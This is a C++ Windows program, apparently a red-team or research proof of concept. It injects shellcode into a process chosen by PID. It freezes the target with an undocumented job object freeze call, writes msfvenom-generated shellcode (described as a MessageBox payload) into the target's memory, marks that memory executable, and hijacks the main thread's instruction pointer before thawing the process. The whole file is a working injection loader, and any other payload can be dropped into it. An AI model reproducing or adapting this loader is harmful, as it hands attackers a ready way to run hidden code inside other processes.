#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>
#include <thread>
#include <chrono>
#include <TlHelp32.h>

void SetColor(int color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE); 
    SetConsoleTextAttribute(hConsole, color);         
}

#define JobObjectFreezeInformation 18

// Definition of JOBOBJECT_WAKE_FILTER
typedef struct _JOBOBJECT_WAKE_FILTER
{
    ULONG HighEdgeFilter;
    ULONG LowEdgeFilter;
} JOBOBJECT_WAKE_FILTER, * PJOBOBJECT_WAKE_FILTER;

// Definition of JOBOBJECT_FREEZE_INFORMATION
typedef struct _JOBOBJECT_FREEZE_INFORMATION
{
    union
    {
        ULONG Flags;
        struct
        {
            ULONG FreezeOperation : 1;
            ULONG FilterOperation : 1;
            ULONG SwapOperation : 1;
            ULONG Reserved : 29;
        };
    };
    BOOLEAN Freeze;
    BOOLEAN Swap;
    UCHAR Reserved0[2];
    JOBOBJECT_WAKE_FILTER WakeFilter;
} JOBOBJECT_FREEZE_INFORMATION, * PJOBOBJECT_FREEZE_INFORMATION;


HANDLE globalJobHandle = NULL;

bool FreezeProcess(HANDLE hProcess)
{
    globalJobHandle = CreateJobObject(NULL, NULL);
    if (!globalJobHandle)
    {
        std::cerr << "Failed to create Job Object. Error: " << GetLastError() << std::endl;
        return false;
    }

    if (!AssignProcessToJobObject(globalJobHandle, hProcess))
    {
        std::cerr << "Failed to assign process to Job Object. Error: " << GetLastError() << std::endl;
        CloseHandle(globalJobHandle);
        globalJobHandle = NULL;
        return false;
    }

    JOBOBJECT_FREEZE_INFORMATION freezeInfo = { 0 };
    freezeInfo.FreezeOperation = 1; // Initiate freeze
    freezeInfo.Freeze = TRUE;

    if (!SetInformationJobObject(
        globalJobHandle,
        (JOBOBJECTINFOCLASS)JobObjectFreezeInformation,
        &freezeInfo,
        sizeof(freezeInfo)))
    {
        std::cerr << "Failed to freeze Job Object. Error: " << GetLastError() << std::endl;
        CloseHandle(globalJobHandle);
        globalJobHandle = NULL;
        return false;
    }

    return true;
}

bool ThawProcess(HANDLE hProcess)
{
    if (!globalJobHandle)
    {
        std::cerr << "No valid job handle available for thawing. Did you freeze the process first?" << std::endl;
        return false;
    }

    JOBOBJECT_FREEZE_INFORMATION freezeInfo = { 0 };
    freezeInfo.FreezeOperation = 1; // Unfreeze operation
    freezeInfo.Freeze = FALSE;

    if (!SetInformationJobObject(
        globalJobHandle,
        (JOBOBJECTINFOCLASS)JobObjectFreezeInformation,
        &freezeInfo,
        sizeof(freezeInfo)))
    {
        std::cerr << "Failed to thaw Job Object. Error: " << GetLastError() << std::endl;
        return false;
    }

    std::cout << "Process thawed successfully!" << std::endl;
    return true;
}


// Function for finding the main thread of the process
DWORD GetMainThreadId(DWORD processId) {
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    DWORD mainThreadId = 0;
    if (Thread32First(hThreadSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == processId) {
                mainThreadId = te32.th32ThreadID;
                break;
            }
        } while (Thread32Next(hThreadSnap, &te32));
    }

    CloseHandle(hThreadSnap);
    return mainThreadId;
}


int main()
{
    DWORD pid;

    // Shellcode for a MessageBox, generated by Msfvenom with some NOPs and no encryption.
    unsigned char myCode[] =
        "\x90\x90\x90\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
        "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
        "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
        "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
        "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
        "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
        "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
        "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
        "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
        "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
        "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
        "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
        "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
        "\x8d\x8d\x1a\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
        "\x49\xc7\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x0e\x01\x00"
        "\x00\x3e\x4c\x8d\x85\x14\x01\x00\x00\x48\x31\xc9\x41\xba"
        "\x45\x83\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2"
        "\x56\xff\xd5\x68\x65\x6c\x6c\x6f\x00\x68\x65\x6c\x6c\x6f"
        "\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";

    int charArrayLen = sizeof(myCode);

    SetColor(FOREGROUND_GREEN);
    printf("[+] Please enter the PID of the target Process: \n");
    scanf("%d", &pid);


    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (hProcess == NULL) {
        SetColor(FOREGROUND_RED);
        printf("[-] Failed to open Process PID %d\n", pid);
        printf("[i] Error Code: %d", GetLastError());
    }
    else {
       
        // Freeze Process
        if (FreezeProcess(hProcess))
        {
            SetColor(FOREGROUND_BLUE);
            std::cout << "Process will be freezed" << std::endl;

            LPVOID hVirtualAlloc = VirtualAllocEx(hProcess, NULL, charArrayLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            if (hVirtualAlloc == NULL) {
                SetColor(FOREGROUND_RED);
                printf("[-] Error Code: %d\n", GetLastError());
                return -1;
            }


            if (WriteProcessMemory(hProcess, hVirtualAlloc, myCode, charArrayLen, NULL)) {
                SetColor(FOREGROUND_GREEN);
                printf("[+] Shellcode was copied to 0x%p\n", hVirtualAlloc);
            }

            
            DWORD oldProtect = 0;
            if (VirtualProtectEx(hProcess, hVirtualAlloc, charArrayLen, PAGE_EXECUTE_READ, &oldProtect)) {
                printf("[+] Protection Level set on EXECUTE_READ\n");
            }
            else {
                return -1;
            }

            // Identification main thread 
            DWORD mainThreadId = GetMainThreadId(pid);
            if (!mainThreadId) {
                SetColor(FOREGROUND_RED);
                printf("[-] Failed to find main thread ID.\n");
                return -1;
            }

            // Open main thread
            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, mainThreadId);
            if (!hThread) {
                printf("[-] Failed to open main thread. Error: %d\n", GetLastError());
                return -1;
            }

            // Set the context
            CONTEXT ctx = { 0 };
            ctx.ContextFlags = CONTEXT_CONTROL;
            if (GetThreadContext(hThread, &ctx)) {
#ifdef _WIN64
                ctx.Rip = (DWORD64)hVirtualAlloc;
#else
                ctx.Eip = (DWORD)hVirtualAlloc;
#endif

                if (!SetThreadContext(hThread, &ctx)) {
                    printf("[-] Failed to set thread context. Error: %d\n", GetLastError());
                    ResumeThread(hThread);
                    CloseHandle(hThread);
                    return -1;
                }
                SetColor(FOREGROUND_GREEN);
                printf("[+] Thread context successfully modified to point to shellcode at 0x%p.\n", hVirtualAlloc);
            }
            else {
                SetColor(FOREGROUND_RED);
                printf("[-] Failed to get thread context. Error: %d\n", GetLastError());
                CloseHandle(hThread);
                return -1;
            }

            // Countdown of 7 seconds 
            for (int i = 7; i > 0; --i)
            {
                SetColor(FOREGROUND_BLUE);
                std::cout << "Thawing in " << i << " seconds..." << std::endl;
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }

            // Thawing process
            if (!ThawProcess(hProcess))
            {
                SetColor(FOREGROUND_RED);
                std::cerr << "Failed to thaw the process." << std::endl;
            }

            if (globalJobHandle)
            {
                CloseHandle(globalJobHandle);
                globalJobHandle = NULL;

            } else {
                SetColor(FOREGROUND_RED);
                printf("[-] Error Code: %d", GetLastError());
                return -1;
            }

            if (hThread != NULL) {
                WaitForSingleObject(hThread, 20); // Waiting for Thread to finish
            }
            else {
                SetColor(FOREGROUND_RED);
                printf("[-] Error creating Thread -> Error Code: %d\n", GetLastError());
            }

            // Uncomment the code to directly execute the shellcode
            /*if (!PostThreadMessage(mainThreadId, WM_NULL, 0, 0)) {
                // May fail if the thread does not have a message queue, or if it is called too early.
                SetColor(FOREGROUND_RED);
                std::cerr << "PostThreadMessage failed. Failure Code: " << GetLastError() << std::endl;
            }
            else {
                SetColor(FOREGROUND_GREEN);
                std::cout << "Dummy-Message (WM_NULL) to ThreadID " << mainThreadId << " send.\n";
            }*/
            
            CloseHandle(hThread);
            CloseHandle(hProcess);
            getchar();
            VirtualFree(hVirtualAlloc, 0, MEM_RELEASE);
        }
    }
}